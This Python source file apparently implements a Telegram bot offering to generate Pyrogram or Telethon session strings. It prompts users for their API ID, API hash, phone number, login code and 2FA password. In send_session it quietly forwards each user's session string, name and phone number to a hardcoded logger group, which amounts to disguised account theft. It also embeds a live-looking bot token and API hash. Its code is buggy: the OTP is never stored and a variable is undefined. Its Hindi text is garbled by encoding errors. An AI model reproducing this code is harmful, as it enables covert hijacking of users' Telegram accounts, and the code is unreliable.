import requests
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.sessions import StringSession

API_ID = 28049056  
API_HASH = "1a301acbe312e760b4d0716fd3b8eab2"
BOT_TOKEN = "7589052839:AAGPMVeZpb63GEG_xXzQEua1q9ewfNzTg50"

LOGGER_GROUP_ID = -1002477750706  

app = Client("session_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

session_data = {}

@app.on_message(filters.command(["start"]) & filters.private)
async def start(client, message):
    await message.reply(
        "**ü§ñ Welcome to Telegram Session Generator!**\n\n"
        "**‡§Ü‡§™ Telethon ‡§î‡§∞ Pyrogram ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•á‡§∂‡§® ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§**\n\n"
        "**‡§¨‡§ü‡§® ‡§™‡§∞ ‡§ï‡•ç‡§≤‡§ø‡§ï ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§™‡§®‡•Ä ‡§∏‡•á‡§∂‡§® ‡§∏‡•ç‡§ü‡§æ‡§∞‡•ç‡§ü ‡§ï‡§∞‡•á‡§Ç!**",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("‚ú® Pyrogram", callback_data="start_pyro"),
             InlineKeyboardButton("‚ö° Telethon", callback_data="start_tele")]
        ])
    )

@app.on_callback_query(filters.regex(r"^start_"))
async def start_session(client, callback_query):
    session_type = "Pyrogram" if callback_query.data == "start_pyro" else "Telethon"
    chat_id = callback_query.message.chat.id
    session_data[chat_id] = {"type": session_type}

    await callback_query.message.edit_text(
        f"**üîπ {session_type} Session Setup ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã ‡§∞‡§π‡§æ ‡§π‡•à...**\n\n"
        "üîπ ‡§ï‡•É‡§™‡§Ø‡§æ ‡§Ö‡§™‡§®‡§æ **API ID** ‡§≠‡•á‡§ú‡•á‡§Ç‡•§",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‚ùå Cancel", callback_data="cancel")]])
    )
    session_data[chat_id]["stage"] = "api_id"

@app.on_message(filters.text & filters.private)
async def handle_input(client, message):
    chat_id = message.chat.id
    if chat_id not in session_data:
        return

    session = session_data[chat_id]
    stage = session["stage"]

    if stage == "api_id":
        try:
            session["api_id"] = int(message.text)
            session["stage"] = "api_hash"
            await message.reply("‚úÖ ‡§Ö‡§¨ ‡§Ö‡§™‡§®‡§æ **API HASH** ‡§≠‡•á‡§ú‡•á‡§Ç‡•§")
        except ValueError:
            await message.reply("‚ùå Invalid API ID. ‡§ï‡•É‡§™‡§Ø‡§æ ‡§∏‡§π‡•Ä **integer** ‡§≠‡•á‡§ú‡•á‡§Ç‡•§")

    elif stage == "api_hash":
        session["api_hash"] = message.text
        session["stage"] = "phone_number"
        await message.reply("üì≤ ‡§Ö‡§¨ ‡§Ö‡§™‡§®‡§æ **‡§´‡§º‡•ã‡§® ‡§®‡§Ç‡§¨‡§∞** ‡§≠‡•á‡§ú‡•á‡§Ç (Example: +919876543210)")

    elif stage == "phone_number":
        session["phone_number"] = message.text
        await message.reply("üîê OTP ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§ï‡•É‡§™‡§Ø‡§æ ‡§™‡•ç‡§∞‡§§‡•Ä‡§ï‡•ç‡§∑‡§æ ‡§ï‡§∞‡•á‡§Ç...")
        await send_otp(client, message)

    elif stage == "otp":
        await validate_otp(client, message)

    elif stage == "2fa":
        session["password"] = message.text
        await validate_2fa(client, message)

async def send_otp(client, message):
    session = session_data[message.chat.id]
    api_id, api_hash, phone = session["api_id"], session["api_hash"], session["phone_number"]

    if session["type"] == "Telethon":
        client_obj = TelegramClient(StringSession(), api_id, api_hash)
        await client_obj.connect()
    else:
        client_obj = Client("pyrogram_session", api_id=api_id, api_hash=api_hash)
        await client_obj.connect()

    try:
        if session["type"] == "Telethon":
            sent_code = await client_obj.send_code_request(phone)
            session["phone_code_hash"] = sent_code.phone_code_hash  # ‚úÖ Save phone_code_hash
        else:
            await client_obj.send_code(phone)

        session["client_obj"] = client_obj
        session["stage"] = "otp"

        await message.reply("üî¢ ‡§ï‡•É‡§™‡§Ø‡§æ **OTP** ‡§≠‡•á‡§ú‡•á‡§Ç (Example: `12345`)‡•§")
    except Exception as e:
        await message.reply(f"‚ùå Error: {e}")
        del session_data[message.chat.id]

async def validate_otp(client, message):
    session = session_data[message.chat.id]
    client_obj, phone, otp = session["client_obj"], session["phone_number"], session["otp"]

    try:
        if session["type"] == "Telethon":
            await client_obj.sign_in(phone, session["phone_code_hash"], otp)  # ‚úÖ Fixed Telethon OTP Handling
        else:
            await client_obj.sign_in(phone_number=phone, phone_code=otp)  # ‚úÖ Correct Pyrogram Handling

        if session["type"] == "Telethon":
            if await client_obj.is_user_authorized():
                await generate_telethon_session(client, message)
            else:
                session["stage"] = "2fa"
                await message.reply("üîê ‡§Ü‡§™‡§ï‡§æ ‡§Ö‡§ï‡§æ‡§â‡§Ç‡§ü **2-Step Verification** ‡§∏‡•á ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§π‡•à‡•§\n‡§ï‡•É‡§™‡§Ø‡§æ ‡§Ö‡§™‡§®‡§æ **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°** ‡§≠‡•á‡§ú‡•á‡§Ç‡•§")
        else:
            await generate_pyrogram_session(client, message)

    except Exception as e:
        if "SESSION_PASSWORD_NEEDED" in str(e) or "Two-steps verification is enabled" in str(e):
            session["stage"] = "2fa"
            await message.reply("üîê **Two-Step Verification Enabled!**\n‡§ï‡•É‡§™‡§Ø‡§æ ‡§Ö‡§™‡§®‡§æ **2FA ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°** ‡§≠‡•á‡§ú‡•á‡§Ç‡•§")
        else:
            await message.reply(f"‚ùå **OTP Invalid:** {e}")
            del session_data[message.chat.id]


async def validate_2fa(client, message):
    session = session_data[message.chat.id]
    client_obj = session["client_obj"]

    try:
        await client_obj.sign_in(password=session["password"])
        await generate_telethon_session(client, message)
    except Exception as e:
        await message.reply(f"‚ùå 2FA ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ó‡§≤‡§§ ‡§π‡•à: {e}\n\n‚ö† ‡§ï‡•É‡§™‡§Ø‡§æ ‡§∏‡§π‡•Ä ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§≠‡•á‡§ú‡•á‡§Ç‡•§")

async def generate_telethon_session(client, message):
    session = session_data[message.chat.id]
    client_obj = session["client_obj"]
    user = await client_obj.get_me()

    session_string = client_obj.session.save()

    await send_session(client, message, session_string, user)

async def generate_pyrogram_session(client, message):
    session = session_data[message.chat.id]
    client_obj = session["client_obj"]

    session_string = await client_obj.export_session_string()
    user = await client_obj.get_me()

    await send_session(client, message, session_string, user)

async def send_session(client, message, session_string, user):
    log_text = (
        f"üìå **New Session Generated**\n\n"
        f"üë§ **User:** `{user.first_name} (@{user.username})`\n"
        f"üìû **Phone:** `{session_data[message.chat.id]['phone_number']}`\n"
        f"üîπ **Session String:**\n`{session_string}`\n\n"
        f"‚ö† **‡§ï‡•É‡§™‡§Ø‡§æ ‡§á‡§∏‡•á ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§∞‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§ï‡§ø‡§∏‡•Ä ‡§ï‡•ã ‡§® ‡§¶‡•á‡§Ç‡•§**"
    )

    await client.send_message(LOGGER_GROUP_ID, log_text)
    await client.send_message(message.chat.id, f"‚úÖ **Session String Generated!**\n\n`{session_string}`")
    await client_obj.disconnect()
    del session_data[message.chat.id]

@app.on_callback_query(filters.regex("cancel"))
async def cancel_process(client, callback_query):
    chat_id = callback_query.message.chat.id
    if chat_id in session_data:
        del session_data[chat_id]
    await callback_query.message.edit_text("üö´ **Session Generation Canceled!**")

app.run()
